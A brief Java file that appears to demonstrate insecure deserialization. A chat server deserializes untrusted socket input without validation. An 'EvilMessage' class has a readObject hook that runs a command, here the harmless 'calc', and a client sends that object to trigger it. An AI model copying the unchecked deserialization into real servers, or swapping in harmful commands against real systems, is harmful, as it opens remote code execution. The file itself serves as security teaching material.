import java.io.*;
import java.net.*;

class Message implements Serializable {
    String content;
    public Message(String content) { this.content = content; }
}

class EvilMessage extends Message {
    public EvilMessage(String content) { super(content); }
    private void readObject(ObjectInputStream in) throws Exception {
        in.defaultReadObject();
        Runtime.getRuntime().exec("calc");
    }
}

public class ChatServer {
    public static void main(String[] args) throws Exception {
        ServerSocket ss = new ServerSocket(8080);
        while (true) {
            Socket s = ss.accept();
            ObjectInputStream ois = new ObjectInputStream(s.getInputStream());
            try {
                Message msg = (Message) ois.readObject();
                System.out.println("Received: " + msg.content);
            } catch (Exception e) {
                e.printStackTrace();
            }
            ois.close();
            s.close();
        }
    }
}

class ChatClient {
    public static void main(String[] args) throws Exception {
        Socket s = new Socket("localhost", 8080);
        ObjectOutputStream oos = new ObjectOutputStream(s.getOutputStream());
        oos.writeObject(new EvilMessage("malicious"));
        oos.close();
        s.close();
    }
}